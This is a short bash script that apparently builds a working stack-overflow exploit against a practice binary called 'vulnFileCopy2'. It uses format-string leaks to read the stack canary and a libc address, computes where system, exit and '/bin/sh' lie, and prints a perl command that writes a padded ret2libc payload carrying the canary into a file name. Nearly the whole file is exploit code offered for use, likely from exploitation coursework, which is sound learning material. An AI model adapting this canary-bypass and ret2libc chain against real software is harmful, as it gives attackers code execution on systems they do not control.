#!/usr/bin/env bash
set -e
# set -ex

# get these from running the ./runit.sh command that has the pre-determined offsets
# of canary and libc_ret
# ./vulnFileCopy2 '%163$x__%187$x.txt'
RET=0xb7db2f21
CAN=0x567a6700
OCAN=$CAN
# grab the values of system, exit, and /bin/sh -- then take the difference from RET
# these need to be the offset from ret -- F address - lib_c
# these are static never have changed so far.
SYS=0x243bf
EX=0x1758f
CMD=0x16518e

# byte align
BA=12

echo "Original values:"
echo "RET - $RET"
echo "CAN - $CAN"
echo "SYS - $SYS"
echo "EX  - $EX"
echo "CMD - $CMD"

function getBase() {
    b=$1
    o=$2
    printf -v newbase "0x%X\n" $(($b + $o)); echo $newbase
}

function tolittle() {
    v=$1
    v2="\x${v:8:2}\x${v:6:2}\x${v:4:2}\x${v:2:2}"
    echo $v2
}

# first get the new base using offset
SYS=$(getBase $RET $SYS)
EX=$(getBase $RET $EX)
CMD=$(getBase $RET $CMD)

# now make it in little endian format
CAN=$(tolittle "$CAN")
SYS=$(tolittle "$SYS")
EX=$(tolittle "$EX")
CMD=$(tolittle "$CMD")

echo "Calcu1ated values in little endian format:"
echo "CAN - $CAN"
echo "SYS - $SYS"
echo "EX - $EX"
echo "CMD - $CMD"

foo="perl -e 'print \"A\"x600 . \"$CAN\" . \"A\"x$BA . \"$SYS\" . \"$EX\" . \"$CMD\"' > '%163\$x__%187\$x.txt'" 

echo $foo

